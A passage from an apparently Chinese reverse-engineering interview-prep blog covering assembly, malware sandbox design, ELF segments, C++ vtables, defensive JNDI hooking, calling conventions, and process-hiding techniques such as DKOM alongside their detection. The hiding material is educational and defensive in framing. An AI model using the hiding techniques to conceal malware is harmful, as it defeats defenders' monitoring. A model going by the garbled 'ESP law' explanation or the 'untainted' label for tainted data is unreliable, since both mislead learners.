<li><strong>识别方法</strong>：<ol>
<li><strong>寻找前置指令</strong>：有条件跳转指令通常紧跟在**比较（<code>cmp</code>）<strong>或</strong>测试（<code>test</code>）**指令之后</li>
<li><strong>分析标志位</strong>：<code>cmp</code> 指令会执行一次减法操作，但不保存结果，只根据结果设置标志位。<code>test</code> 指令会执行一次逻辑与操作，也不保存结果，同样只设置标志位</li>
<li><strong>理解逻辑</strong>：当看到 <code>cmp eax, ebx</code> 后跟着 <code>je</code> 时，它的逻辑就等同于 C 语言的 <code>if (eax == ebx)</code></li>
</ol>
</li>
</ul>
<p><strong>如何识别内存访问</strong></p>
<p>内存访问涉及程序从内存中读或写数据。在汇编代码中，这通常通过方括号 <code>[]</code> 来表示</p>
<p><strong>1. 直接内存访问</strong></p>
<p>这是最直接的方式，通常是访问全局变量或特定地址</p>
<ul>
<li><strong>格式</strong>：<code>mov eax, [0x401000]</code></li>
<li><strong>识别方法</strong>：指令的操作数直接是一个十六进制地址，且用方括号包围。这表示从这个地址读取数据。例如，<code>mov eax, [0x401000]</code> 的意思是把内存地址 <code>0x401000</code> 处的值加载到 <code>eax</code> 寄存器</li>
</ul>
<p><strong>2. 间接内存访问</strong></p>
<p>间接访问更为常见，它通过寄存器中存储的地址来访问内存</p>
<ul>
<li><strong>格式</strong>：<code>mov eax, [ebx]</code></li>
<li><strong>识别方法</strong>：方括号中是一个寄存器。这表示程序从寄存器 <code>ebx</code> 中存储的地址读取数据。这在访问指针、数组元素或动态分配的内存时非常常见</li>
</ul>
<p><strong>3. 相对内存访问</strong></p>
<p>这种方式结合了基址寄存器和偏移量</p>
<ul>
<li><strong>格式</strong>：<code>mov eax, [ebx + 8]</code></li>
<li><strong>识别方法</strong>：方括号中包含一个基址寄存器（如 <code>ebx</code>）和一个数字偏移量。这通常用于访问结构体成员或栈上的局部变量。例如，<code>mov eax, [ebp-4]</code> 是一种非常常见的模式，它表示访问栈上<strong>栈帧基址</strong>（<code>ebp</code>）向下偏移 4 字节处的局部变量</li>
</ul>
<p><strong>4. 复杂内存访问</strong></p>
<p>更复杂的访问模式包括索引寄存器和比例因子，通常用于访问数组</p>
<ul>
<li><strong>格式</strong>：<code>mov eax, [ebx + esi * 4]</code></li>
<li><strong>识别方法</strong>：这表示一个数组访问，<code>ebx</code> 是数组的基地址，<code>esi</code> 是索引，<code>4</code> 是每个元素的大小（例如，一个 <code>int</code> 占 4 字节）。这等同于 C 语言的 <code>eax = array[esi]</code></li>
</ul>
<hr>
<h3 id="做一个沙箱，有什么需要重定向的"><a href="#做一个沙箱，有什么需要重定向的" class="headerlink" title="做一个沙箱，有什么需要重定向的"></a>做一个沙箱，有什么需要重定向的</h3><p><strong>1. 文件系统</strong></p>
<p>这是最基本的重定向。一个恶意程序通常会读写文件、创建新文件或删除现有文件。你必须让它以为自己在操作真实的文件系统，但实际上，所有这些操作都被隔离在一个虚拟的、临时的环境中</p>
<ul>
<li><strong>重定向读写操作</strong>：<ul>
<li><strong>拦截</strong> <code>open</code>, <code>read</code>, <code>write</code>, <code>close</code> 等系统调用</li>
<li>将所有对宿主机文件的访问重定向到沙箱内部的<strong>虚拟文件系统</strong>或一个特定的临时文件夹</li>
<li>如果程序试图访问关键系统文件（如 <code>C:\Windows\System32</code>），应拒绝其请求或返回一个虚拟的、无害的版本</li>
</ul>
</li>
</ul>
<p><strong>2. 注册表</strong></p>
<p>在 Windows 环境下，注册表是恶意软件进行持久化和存储配置的关键</p>
<ul>
<li><strong>重定向注册表操作</strong>：<ul>
<li><strong>拦截</strong> <code>RegCreateKey</code>, <code>RegSetValue</code>, <code>RegOpenKey</code> 等注册表 API 调用</li>
<li>将所有写入操作重定向到沙箱内存中的一个<strong>虚拟注册表</strong></li>
<li>当程序读取注册表时，先从虚拟注册表中查找，如果不存在，再从宿主机注册表读取，但绝不允许它修改宿主机注册表</li>
</ul>
</li>
</ul>
<p><strong>3. 网络通信</strong></p>
<p>恶意软件的另一大特征就是与外部服务器进行通信，例如下载其他恶意模块、发送窃取的数据或接收指令</p>
<ul>
<li><strong>重定向网络连接</strong>：<ul>
<li><strong>拦截</strong> <code>socket</code>, <code>connect</code>, <code>send</code>, <code>recv</code> 等网络系统调用</li>
<li>你可以选择将所有网络连接<strong>完全禁止</strong>，或者将它们重定向到一个<strong>本地代理</strong>，由代理来记录和控制所有流量</li>
<li>理想的沙箱会<strong>伪造 DNS 解析</strong>，将恶意域名指向一个本地 IP，然后让代理服务器来处理这些连接，从而捕获所有网络数据包，而不让它们真正离开宿主机</li>
</ul>
</li>
</ul>
<p><strong>4. 进程与线程</strong></p>
<p>许多恶意软件会创建新进程、注入代码或修改其他进程的内存以隐藏自身</p>
<ul>
<li><strong>重定向进程操作</strong>：<ul>
<li><strong>拦截</strong> <code>CreateProcess</code>, <code>CreateThread</code>, <code>InjectProcess</code>, <code>WriteProcessMemory</code> 等 API 调用</li>
<li>沙箱应监控所有新创建的进程，确保它们也运行在受控环境中。</li>
<li>对于进程注入，你可以直接<strong>拒绝</strong>这类行为，或者将其重定向到一个虚拟的环境，以防止对宿主机上其他进程的感染</li>
</ul>
</li>
</ul>
<p><strong>5. 系统信息</strong></p>
<p>为了躲避沙箱，恶意软件会查询系统信息来判断自己是否被监控。你需要对这些查询进行欺骗</p>
<ul>
<li><strong>重定向系统信息查询</strong>：<ul>
<li><strong>拦截</strong> <code>cpuid</code>, <code>GetSystemInfo</code> 等 API 调用</li>
<li>当恶意程序查询 CPU 制造商、内存大小或系统时间等信息时，你需要返回<strong>虚假的值</strong>，让它以为自己在一个真实的物理机环境中。比如，将 <code>VMware</code> 制造商字符串替换为 <code>GenuineIntel</code>，或者让系统时间流逝得更慢</li>
</ul>
</li>
</ul>
<p><strong>6. 渲染与屏幕</strong></p>
<p>某些恶意软件可能会尝试截屏或与桌面环境交互</p>
<ul>
<li><p><strong>重定向屏幕操作</strong>：</p>
<ul>
<li><strong>拦截</strong> <code>GetDC</code>, <code>BitBlt</code> 等与屏幕渲染相关的 API</li>
<li>你可以将截屏数据重定向到沙箱的临时文件，而不是让它访问真实的桌面内容</li>
</ul>
<hr>
<h3 id="Linux-程序分为哪几个段"><a href="#Linux-程序分为哪几个段" class="headerlink" title="Linux 程序分为哪几个段"></a>Linux 程序分为哪几个段</h3></li>
</ul>
<p><strong>1. 代码段</strong></p>
<p>代码段也叫文本段，<strong>存储的是程序的可执行机器码</strong>。它通常是只读的，这样可以防止程序意外地修改自身的指令，从而增强了程序的健壮性。由于代码段是只读的，当有多个进程执行同一个程序时（比如多个用户同时运行 <code>ls</code> 命令），它们可以共享同一个代码段，从而节省内存</p>
<p><strong>2. 数据段</strong></p>
<p>数据段主要用于<strong>存储已初始化的全局变量和静态变量</strong>。这个段在程序加载到内存时就被分配，并在程序运行期间一直存在。它的内容是可读写的，允许程序修改这些变量的值</p>
<p>例如，在 C 语言中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> global_var = <span class="number">10</span>; <span class="comment">// 存储在数据段</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> static_var = <span class="number">20</span>; <span class="comment">// 存储在数据段</span></span><br></pre></td></tr></table></figure>

<p><strong>3. 未初始化数据段</strong></p>
<p>BSS（Block Started by Symbol）段用于<strong>存储未初始化的全局变量和静态变量</strong>。与数据段不同，这个段在程序加载时并不会占用实际的磁盘空间。操作系统会在程序加载时为其分配内存，并自动将所有值初始化为零。这样做可以节省可执行文件的大小</p>
<p>例如，在 C 语言中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> uninitialized_global; <span class="comment">// 存储在 BSS 段</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> uninitialized_static; <span class="comment">// 存储在 BSS 段</span></span><br></pre></td></tr></table></figure>

<p><strong>4. 堆段</strong></p>
<p>堆段用于<strong>动态内存分配</strong>。当程序在运行时需要额外内存时（例如，使用 C 语言中的 <code>malloc()</code> 或 C++ 中的 <code>new</code>），这些内存就会在堆上分配。堆是自下而上增长的，通常由低地址向高地址扩展。程序的生命周期中，堆的大小是可变的</p>
<p><strong>5. 栈段</strong></p>
<p>栈段用于<strong>存储局部变量、函数参数和返回地址</strong>。它是一种后进先出（LIFO）的数据结构。每次调用函数时，新的栈帧（stack frame）就会被推入栈中，包含了该函数的局部变量和参数。函数调用结束后，该栈帧就会被弹出。栈段是自上而下增长的，通常由高地址向低地址扩展</p>
<p><strong>6. 命令行参数和环境变量段</strong></p>
<p>这个段通常位于栈段的上方，用于<strong>存储传递给程序的命令行参数和环境变量</strong>。例如，当你在终端运行 <code>ls -l</code> 时，<code>-l</code> 这个参数就会被存储在这个段中</p>
<hr>
<h3 id="ESP-定律原理知道吗"><a href="#ESP-定律原理知道吗" class="headerlink" title="ESP 定律原理知道吗"></a>ESP 定律原理知道吗</h3><p><strong>ESP 定律的原理</strong></p>
<p>ESP 定律的核心思想是：在正常的函数调用和返回过程中，<strong>栈指针（ESP 在 32 位系统，RSP 在 64 位系统）在进入函数时和离开函数时是相等的</strong></p>
<p>或者更准确地说，<code>call</code> 指令在将返回地址压入栈后，会将 ESP 减小。当函数返回（通过 <code>ret</code> 指令）时，<code>ret</code> 指令会弹出返回地址，并自动调整 ESP，使其回到 <code>call</code> 指令执行之前的状态</p>
<p><strong>ESP 定律的两个核心结论：</strong></p>
<ol>
<li>在函数内部，只要没有发生新的函数调用或异常，<code>push</code> 和 <code>pop</code> 指令的操作是<strong>对称的</strong>。也就是说，每一个 <code>push</code> 都有一个对应的 <code>pop</code>，所以 ESP 的最终变化是零</li>
<li>在函数返回时，<code>ret</code> 指令会正确地将控制权返回给调用方，其前提是<strong>函数执行完毕时 ESP 寄存器的值正好指向 <code>call</code> 指令压入的返回地址</strong></li>
</ol>
<p>如果一个函数在返回时，ESP 的值不是返回地址，那么 <code>ret</code> 指令会从一个错误的位置取地址，导致程序崩溃或跳转到不可预知的地址</p>
<hr>
<h3 id="C-程序怎么去逆向找虚表"><a href="#C-程序怎么去逆向找虚表" class="headerlink" title="C++ 程序怎么去逆向找虚表"></a>C++ 程序怎么去逆向找虚表</h3><p><strong>虚表（vtable）的编译后形态</strong></p>
<p>在 C++ 中，当一个类包含虚函数时，编译器会做两件事：</p>
<ol>
<li>为该类生成一个<strong>虚表</strong>。这个虚表本质上是一个<strong>函数指针数组</strong>。数组中的每个元素都指向该类中一个虚函数的实际地址</li>
<li>为该类的每个对象（实例）在内存布局的开头添加一个隐藏的<strong>虚表指针（vptr）</strong>。这个指针指向该类的虚表</li>
</ol>
<p>因此，逆向寻找虚表的过程，就是找到这个隐藏的 <code>vptr</code>，并顺藤摸瓜找到它指向的虚表</p>
<p><strong>逆向寻找虚表的三种主要方法</strong></p>
<p><strong>方法一：寻找虚表指针（vptr）的初始化</strong></p>
<p>这是最直接也最常用的方法。虚表指针通常在对象的构造函数中被初始化</p>
<ol>
<li><strong>定位构造函数</strong>：在 C++ 程序中，当你使用 <code>new</code> 关键字创建一个对象时，编译器会调用该类的构造函数。在反汇编代码中，你会看到对 <code>new</code> 操作的封装，然后是对构造函数的调用</li>
<li><strong>查找虚表指针的赋值</strong>：在构造函数的开头，通常会有类似 <code>mov [ecx], offset class_vtable</code> 或 <code>mov [this], offset class_vtable</code> 的指令（取决于调用约定和寄存器）<ul>
<li><code>this</code> 指针（通常在 <code>ecx</code> 或 <code>rcx</code> 寄存器中）指向新创建的对象</li>
<li><code>offset class_vtable</code> 是虚表的地址，这是一个常量，通常由链接器确定</li>
<li>这条指令的含义是：将虚表的地址存入对象的第一个成员变量中，这个变量就是 <code>vptr</code></li>
</ul>
</li>
<li><strong>识别虚表</strong>：一旦你找到了虚表的地址，你就可以跳转到这个地址，IDA Pro 或 Ghidra 通常会将其识别为数据段中的一个指针数组</li>
</ol>
<p><strong>方法二：从虚函数的调用处反推</strong></p>
<p>如果你无法直接找到构造函数，可以从虚函数的调用点入手。虚函数的调用通常是通过 <code>vptr</code> 进行的间接调用</p>
<ol>
<li><strong>识别间接调用</strong>：寻找类似 <code>call [eax+offset]</code> 或 <code>call [vptr]</code> 的指令<ul>
<li><code>eax</code> 通常包含 <code>this</code> 指针，指向对象实例</li>
<li><code>offset</code> 是一个数字，通常是 <code>vptr</code> 在对象内存布局中的偏移量（在单继承情况下通常是 <code>0</code>）</li>
<li>这条指令的含义是：从 <code>eax</code> 指向的内存位置（即 <code>vptr</code>）获取一个地址，然后再加上一个偏移量，最终跳转到那个地址执行代码</li>
</ul>
</li>
<li><strong>分析偏移量</strong>：通过观察偏移量，你可以判断这是虚表中的第几个虚函数。例如，<code>call [eax+8]</code> 意味着调用虚表中的第二个函数（因为每个函数指针通常是 4 或 8 字节）</li>
<li><strong>反推虚表</strong>：找到 <code>vptr</code> 的地址，然后跳转到该地址。你可以向上或向下遍历这个指针数组，来识别其他的虚函数</li>
</ol>
<p><strong>方法三：利用 IDA Pro 的自动化识别功能</strong></p>
<p>IDA Pro 和 Ghidra 这样的高级反汇编器拥有强大的自动化分析能力，可以极大地简化寻找虚表的过程</p>
<ol>
<li><strong>启用 C++ RTTI 分析</strong>：在 IDA 的 <code>Options -&gt; General -&gt; IDA</code> 窗口中，确保 C++ 的<strong>RTTI (Run-Time Type Information)</strong> 分析选项已启用。这能帮助 IDA 识别类和虚表结构</li>
<li><strong>函数识别</strong>：让 IDA 自动分析程序，它通常会尝试识别标准库中的虚表</li>
<li><strong>数据段搜索</strong>：在 IDA 的数据段（通常是 <code>.data</code> 或 <code>.rdata</code>）中搜索，寻找<strong>指针数组</strong>。如果一个数组中的元素都是函数地址，并且这些函数之间有逻辑关联，那它很可能就是一个虚表。IDA 通常会把这些识别出来的虚表标记为 <code>vftable</code> 或类似的名字</li>
</ol>
<hr>
<h3 id="进程隐藏技术是什么，如何检测"><a href="#进程隐藏技术是什么，如何检测" class="headerlink" title="进程隐藏技术是什么，如何检测"></a>进程隐藏技术是什么，如何检测</h3><p><strong>常见的进程隐藏技术</strong></p>
<p>这些技术通常分为两大类：用户态隐藏和内核态隐藏。</p>
<p><strong>1. 用户态进程隐藏</strong></p>
<p>这类技术在用户态运行，主要通过 Hook（钩取）或篡改 API 调用来欺骗进程列表工具</p>
<ul>
<li><strong>API Hooking</strong>：恶意软件可以 Hook 掉用于枚举进程的 Windows API 函数，例如 <code>CreateToolhelp32Snapshot</code>、<code>Process32First</code> 和 <code>Process32Next</code>。当任务管理器或其他进程查看器调用这些函数时，Hook 函数会拦截调用，并过滤掉恶意进程的信息，只返回其余正常进程的列表</li>
<li><strong>直接修改内存</strong>：一些恶意软件会直接在内存中找到任务管理器或进程列表工具的进程列表，然后将自身从这个列表中移除。这种方法更具侵略性，但成功率较低，因为不同版本的操作系统或工具，其内存结构可能不同</li>
<li><strong>进程名伪装</strong>：这是最简单、最基础的伪装。恶意软件会将自己的进程名修改成系统关键进程的名字，例如 <code>svchost.exe</code> 或 <code>lsass.exe</code>。这虽然不能隐藏进程，但可以有效迷惑用户和安全人员。</li>
</ul>
<p><strong>2. 内核态进程隐藏</strong></p>
<p>这类技术通常通过加载驱动程序来获得内核权限，从更底层的数据结构中隐藏自己，使其更难被检测</p>
<ul>
<li><strong>DKOM (Direct Kernel Object Manipulation)</strong>：这是最强大的进程隐藏技术之一。在 Windows 内核中，所有进程的信息都存储在一个双向链表 <code>PsActiveProcessHead</code> 中。恶意驱动程序可以在内核态直接操作这个链表，将自身的进程对象从链表中移除。由于任务管理器、进程查看器等工具最终都依赖这个链表来获取进程信息，这种方法可以从根本上隐藏进程</li>
<li><strong>修改进程对象属性</strong>：除了从链表中移除，恶意驱动还可以直接修改进程对象（<code>EPROCESS</code> 结构）中的某些标志，使其看起来像是已终止或不活跃的进程，从而欺骗依赖于这些标志的工具</li>
<li><strong>内核 API Hooking</strong>：类似于用户态 Hooking，恶意驱动程序可以 Hook 掉内核中用于进程枚举的函数，例如 <code>PsLookupProcessByProcessId</code> 或 <code>ZwQuerySystemInformation</code>。这种 Hook 更加底层，也更难被发现</li>
</ul>
<p><strong>如何检测进程隐藏技术</strong></p>
<p>检测进程隐藏是一个复杂的任务，需要使用多层次的方法和工具</p>
<p><strong>1. 跨进程检测</strong></p>
<ul>
<li><strong>进程列表比对</strong>：从两个或更多不同的数据源获取进程列表，然后进行比对。例如，同时使用任务管理器和 Sysinternals 工具套件中的 <code>Process Explorer</code>。如果某个进程在一个列表中出现，而在另一个列表中没有，那么它很可能被隐藏了</li>
<li><strong>命令行工具</strong>：使用命令行工具（如 <code>tasklist</code> 或 <code>wmic</code>）获取进程列表，并将其结果与图形化工具进行比对</li>
</ul>
<p><strong>2. 底层数据结构检查</strong></p>
<ul>
<li><strong>利用 DKOM 的逆向检测</strong>：反恶意软件工具可以在内核态直接遍历 <code>PsActiveProcessHead</code> 链表，并与通过 <code>ZwQuerySystemInformation</code> 等高层 API 获取的进程列表进行比对。如果链表中的某个进程没有出现在 API 返回的列表中，就说明存在 DKOM 隐藏</li>
<li><strong>检查 <code>EPROCESS</code> 结构</strong>：反恶意软件工具可以检查 <code>EPROCESS</code> 结构中与隐藏相关的标志，例如进程状态和父进程 ID，来识别异常情况</li>
</ul>
<p><strong>3. 行为分析</strong></p>
<ul>
<li><strong>网络连接监控</strong>：即使进程被隐藏，它仍然需要进行网络通信。通过监控所有网络连接，并将其与已知的进程列表进行比对，可以发现那些没有对应进程的异常网络活动</li>
<li><strong>文件句柄和互斥量</strong>：恶意进程可能会创建文件句柄或互斥量。通过枚举这些系统资源，可以发现那些属于隐藏进程的资源</li>
<li><strong>CPU 使用率和内存占用</strong>：即使进程被隐藏，它仍然会占用 CPU 和内存。通过监控系统的整体资源使用情况，可以识别出那些没有对应进程的异常资源消耗</li>
</ul>
<hr>
<h3 id="如果多进程下，A-进程的-Source-触发到了-B-进程的-sink-点，如何溯源"><a href="#如果多进程下，A-进程的-Source-触发到了-B-进程的-sink-点，如何溯源" class="headerlink" title="如果多进程下，A 进程的 Source 触发到了 B 进程的 sink 点，如何溯源"></a>如果多进程下，A 进程的 Source 触发到了 B 进程的 sink 点，如何溯源</h3><p><strong>1. 识别并关联进程间通信（IPC）</strong></p>
<p>首先，你需要将进程 A 的 <code>source</code> 和进程 B 的 <code>sink</code> 关联起来</p>
<ul>
<li><strong>监控 IPC 调用</strong>：在两个进程中，同时监控所有 IPC 相关的系统调用。在 Linux 上，这可能包括 <code>pipe()</code>, <code>socket()</code>, <code>shmget()</code>, <code>msgget()</code> 等。在 Windows 上，这可能是命名管道、共享内存的 API 调用</li>
<li><strong>记录数据流</strong>：不仅要记录 IPC 调用，还要记录通过 IPC 传递的<strong>数据内容</strong>。这是将 <code>source</code> 和 <code>sink</code> 联系起来的关键。例如，如果进程 A 通过管道写入了一个特定的恶意数据，你需要记录下这个数据，然后追踪它是否被进程 B 从管道中读出</li>
<li><strong>使用动态分析工具</strong>：利用动态分析工具来自动化这个过程<ul>
<li><strong>Frida&#x2F;Ptrace</strong>：你可以编写脚本，利用 Frida 或 Ptrace 这样的动态插桩框架，在两个进程中同时 Hook 所有 IPC 相关的函数</li>
<li><strong>eBPF</strong>：在 Linux 上，eBPF 是一个强大的工具。你可以编写 eBPF 程序，在内核层面监控所有进程间的通信，并记录下通信的数据和进程 ID。这比用户态 Hooking 更稳定、更难以被绕过</li>
</ul>
</li>
</ul>
<p><strong>2. 构建跨进程的控制流图</strong></p>
<p>传统的控制流图只在单个进程内工作。要解决多进程溯源问题，你需要构建一个<strong>跨进程的、依赖于 IPC 事件的控制流图</strong></p>
<ul>
<li><strong>进程内 CFG</strong>：首先，分别构建进程 A 和进程 B 的独立控制流图</li>
<li><strong>跨进程边（Inter-Process Edges）</strong>：在两个 CFG 之间，根据 IPC 事件添加“边”<ul>
<li>当进程 A 执行 <code>write()</code> 系统调用时，在 CFG 中添加一条从该 <code>write()</code> 指令到进程 B 的 <code>read()</code> 系统调用的边。这条边代表了数据的流动</li>
<li>这条边需要包含<strong>时间戳</strong>和<strong>数据内容</strong>，以确保因果关系的正确性。</li>
</ul>
</li>
</ul>
<p>通过这种方式，你可以将 A 进程的 <code>source</code> 点和 B 进程的 <code>sink</code> 点在同一个图中连接起来，从而实现完整的溯源</p>
<p><strong>3. 自动化与工具支持</strong></p>
<p>手动进行上述分析几乎是不可能的。你需要依赖强大的自动化工具</p>
<ul>
<li><p><strong>进程监控工具</strong>：</p>
<ul>
<li><strong>Linux</strong>：<code>strace</code> 可以追踪系统调用。<code>ltrace</code> 可以追踪库函数调用。但它们只对单个进程有效，你需要同时对两个进程使用</li>
<li><strong>Windows</strong>：Sysinternals 的 <code>Procmon</code> 是一个强大的工具，可以记录所有进程的系统调用和文件&#x2F;注册表操作</li>
</ul>
</li>
<li><p><strong>动态污点分析</strong>：</p>
<ul>
<li><strong>Taint Analysis</strong> 是一种强大的技术，它可以标记“不干净”（untainted）的数据，并追踪其在程序中的传播</li>
<li>你可以将进程 A 的 <code>source</code> 数据标记为“污点”。然后，追踪这个污点数据在进程 A 内的传播。当它通过 IPC 传递给进程 B 时，这个污点也会被传递过去。最终，如果污点数据到达了进程 B 的 <code>sink</code> 点，你就可以得到完整的溯源路径</li>
<li>这通常需要修改虚拟机监视器（VMM）或使用专门的动态分析框架来实现</li>
</ul>
<hr>
</li>
</ul>
<h3 id="JNDI-如何做-Hook"><a href="#JNDI-如何做-Hook" class="headerlink" title="JNDI 如何做 Hook"></a>JNDI 如何做 Hook</h3><p><strong>1. 使用 Java Agent 动态修改字节码</strong></p>
<p>这是最强大和最通用的 Hook 方法。Java Agent 可以在不修改源代码的情况下，在 JVM 运行时动态地修改类的字节码</p>
<ul>
<li><strong>原理</strong>：创建一个 Java Agent，并在 JVM 启动时通过 <code>-javaagent</code> 参数加载它。在 Agent 的 <code>premain</code> 或 <code>agentmain</code> 方法中，你可以使用 <strong>ASM</strong>、<strong>Javassist</strong> 或 <strong>Byte Buddy</strong> 等字节码操作库，找到 <code>InitialContext.lookup(name)</code> 所在的类和方法</li>
<li><strong>Hook 实现</strong>：找到目标方法后，可以修改它的字节码，在其原始逻辑执行前或执行后插入你自己的代码<ul>
<li><strong>插入安全检查</strong>：在 <code>lookup</code> 方法的开头，插入一段代码来检查传入的 URL。你可以判断 URL 是否符合预设的白名单，或者直接拒绝所有远程 JNDI 请求</li>
<li><strong>记录日志</strong>：将 <code>lookup</code> 方法的参数和调用堆栈记录下来，以便进行审计</li>
<li><strong>修改返回对象</strong>：如果 URL 被判定为恶意，你可以修改 <code>lookup</code> 方法的返回值为一个安全的对象，而不是让其继续进行远程查找</li>
</ul>
</li>
<li><strong>优点</strong>：非常灵活，可以 Hook 任何类的任何方法，无需访问源代码</li>
<li><strong>缺点</strong>：需要深入理解 Java 字节码，且实现起来比较复杂。</li>
</ul>
<p><strong>2. 使用动态代理</strong></p>
<p>动态代理是一种更高级的 Hook 方法，它通过 Java 的反射机制来创建接口的代理对象</p>
<ul>
<li><strong>原理</strong>：如果你知道应用程序使用的是某个 JNDI 接口（例如 <code>Context</code>），你可以创建一个代理对象，这个代理对象会实现相同的接口，并在所有方法调用时，将调用转发给你自己的处理逻辑</li>
<li><strong>Hook 实现</strong>：<ol>
<li>找到应用程序创建 <code>InitialContext</code> 的地方</li>
<li>用你自己的代理类替换 <code>InitialContext</code> 的实例</li>
<li>在代理类中，拦截 <code>lookup(name)</code> 方法的调用</li>
<li>在 <code>lookup</code> 方法的实现中，你可以先执行安全检查，然后再决定是否调用原始的 <code>InitialContext.lookup(name)</code></li>
</ol>
</li>
<li><strong>优点</strong>：不需要字节码操作，相对简单</li>
<li><strong>缺点</strong>：只能 Hook 接口，对于没有实现接口的类不起作用。此外，需要修改应用程序的某些部分来插入代理，不像 Java Agent 那样完全透明</li>
</ul>
<p><strong>3. 修改 JVM 参数</strong></p>
<p>这是最简单的 Hook 方法，但功能也最有限</p>
<ul>
<li><strong>原理</strong>：一些 JVM 实现了特殊的参数来控制 JNDI 的行为。例如，在一些版本的 Java 中，可以通过设置 <code>com.sun.jndi.rmi.object.trustURLCodebase=false</code> 来阻止 RMI 客户端加载远程对象</li>
<li><strong>Hook 实现</strong>：只需在 JVM 启动命令中添加这些参数即可</li>
<li><strong>优点</strong>：非常简单，无需编写代码</li>
<li><strong>缺点</strong>：依赖于特定的 JVM 版本和参数，无法进行细粒度的控制，也不能用于日志记录等目的</li>
</ul>
<h3 id="data-段存放哪些数据"><a href="#data-段存放哪些数据" class="headerlink" title=".data 段存放哪些数据"></a>.data 段存放哪些数据</h3><p><code>.data</code> 段，即数据段，主要存放<strong>已经初始化的全局变量和静态变量</strong></p>
<p>当编译器编译程序时，如果发现一个全局变量或静态变量被赋予了一个非零的初始值（比如 <code>int global_var = 10;</code>），那么这个变量的值就会被存储在<code>.data</code>段中。这个段在可执行文件（比如<code>.exe</code> 或可执行的 ELF 文件）中是实际存在的，并占用文件空间。当程序加载到内存时，操作系统的加载器会把这部分数据原封不动地加载到内存中</p>
<ul>
<li><p><strong>例子</strong>：</p>
<ul>
<li><code>int initialized_global = 100;</code></li>
<li><code>static char static_string[] = &quot;Hello World&quot;;</code></li>
</ul>
<hr>
</li>
</ul>
<h3 id="bss-段存放哪些数据"><a href="#bss-段存放哪些数据" class="headerlink" title=".bss 段存放哪些数据"></a>.bss 段存放哪些数据</h3><p><code>.bss</code> 段，即未初始化数据段（<strong>B</strong>lock <strong>S</strong>tarted by <strong>S</strong>ymbol），主要存放<strong>未初始化的全局变量和静态变量</strong></p>
<p><code>.bss</code>段的特殊之处在于，它在可执行文件中<strong>不占用任何实际的磁盘空间</strong>。它只在可执行文件中有一个占位符，告诉操作系统在加载程序时需要为这块区域分配多大的内存。当程序被加载到内存后，操作系统会为 <code>.bss</code> 段分配一片连续的内存空间，并且会<strong>自动将其所有字节初始化为零</strong></p>
<p>这种设计是为了节省可执行文件的大小。如果一个程序有很多未初始化的全局变量，将它们全部写进文件会非常浪费空间，因为它们的值都是已知的（默认是0）</p>
<ul>
<li><strong>例子</strong>：<ul>
<li><code>int uninitialized_global;</code></li>
<li><code>static char static_array[1024];</code></li>
</ul>
</li>
</ul>
<hr>
<h3 id="函数调用时的流程，参数如何传入以及寄存器、栈的变化"><a href="#函数调用时的流程，参数如何传入以及寄存器、栈的变化" class="headerlink" title="函数调用时的流程，参数如何传入以及寄存器、栈的变化"></a>函数调用时的流程，参数如何传入以及寄存器、栈的变化</h3><p><strong>函数调用前的准备 (Caller)</strong></p>
<p>在调用函数前，调用方（caller）会进行以下准备：</p>
<ol>
<li><strong>参数传递</strong>：<ul>
<li><strong>寄存器优先</strong>：对于前几个参数（通常是前4个，具体数量取决于调用约定），它们会被放入特定的通用寄存器中。在 x64 <code>fastcall</code> 约定下，参数会依次放入 <strong>RCX, RDX, R8, R9</strong> 寄存器。这种方式非常快，因为它避免了昂贵的内存操作</li>
<li><strong>栈传递</strong>：如果参数数量超过了寄存器的限制，剩下的参数就会被从右到左（或从左到右，取决于具体约定）压入栈中</li>
</ul>
</li>
<li><strong>栈帧对齐</strong>：为了保证性能，特别是对于一些高级指令集（如 SSE、AVX），栈帧需要对齐到特定的字节边界（通常是16字节）。调用方会确保在调用 <code>call</code> 指令前，栈指针 <strong>RSP</strong> 是对齐的</li>
<li><strong>调用指令</strong>：最后，调用方会执行 <code>call</code> 指令。<code>call</code> 指令有两个主要作用：<ul>
<li>将<strong>下一条指令的地址</strong>（即函数的返回地址）压入栈中</li>
<li>跳转到被调用函数（callee）的入口地址</li>
</ul>
</li>
</ol>
<p><strong>函数执行过程中的变化 (Callee)</strong></p>
<p>一旦 <code>call</code> 指令将控制权转移给被调用函数（callee），它会做以下几件事：</p>
<ol>
<li><strong>保存旧栈帧</strong>：函数的第一条指令通常是 <code>push rbp</code>。这将调用方函数的基址寄存器 <strong>RBP</strong> 的值压入栈中，保存了调用方的栈帧信息</li>
<li><strong>建立新栈帧</strong>：接下来，函数会执行 <code>mov rbp, rsp</code>。这会将栈指针 <strong>RSP</strong> 的当前值复制到 <strong>RBP</strong>，从而建立起当前函数的栈帧。从现在开始，所有局部变量和参数都可以通过 <strong>RBP</strong> 加上或减去一个偏移量来访问</li>
<li><strong>局部变量分配</strong>：如果函数有局部变量，它会通过 <code>sub rsp, [size]</code> 指令在栈上分配空间。这个操作会使栈指针 <strong>RSP</strong> 向低地址方向移动，为局部变量腾出空间</li>
<li><strong>保存非易失性寄存器</strong>：<ul>
<li><strong>易失性寄存器（Volatile &#x2F; Caller-saved）</strong>：<code>RAX</code>, <code>RCX</code>, <code>RDX</code>, <code>R8</code>-<code>R11</code>等。这些寄存器被认为是临时的，调用方<strong>不指望</strong>它们在函数返回后保持原值</li>
<li><strong>非易失性寄存器（Non-volatile &#x2F; Callee-saved）</strong>：<code>RBX</code>, <code>RBP</code>, <code>RDI</code>, <code>RSI</code>, <code>R12</code>-<code>R15</code>等。这些寄存器被认为需要保持其值不变。如果被调用函数需要使用它们，就必须在使用前将它们的值压入栈中，并在返回前恢复</li>
</ul>
</li>
<li><strong>执行函数主体</strong>：现在，函数开始执行其核心逻辑。它可以使用传递进来的参数（通过寄存器或栈），也可以使用自己栈上的局部变量</li>
</ol>
<p><strong>函数返回时的清理 (Callee &amp; Caller)</strong></p>
<p>当函数执行完毕，准备返回时，会进行以下清理工作：</p>
<ol>
<li><strong>恢复栈指针</strong>：函数会执行 <code>mov rsp, rbp</code>。这个指令会将 <strong>RSP</strong> 的值恢复到进入函数时的状态，从而<strong>释放所有局部变量</strong>所占用的栈空间</li>
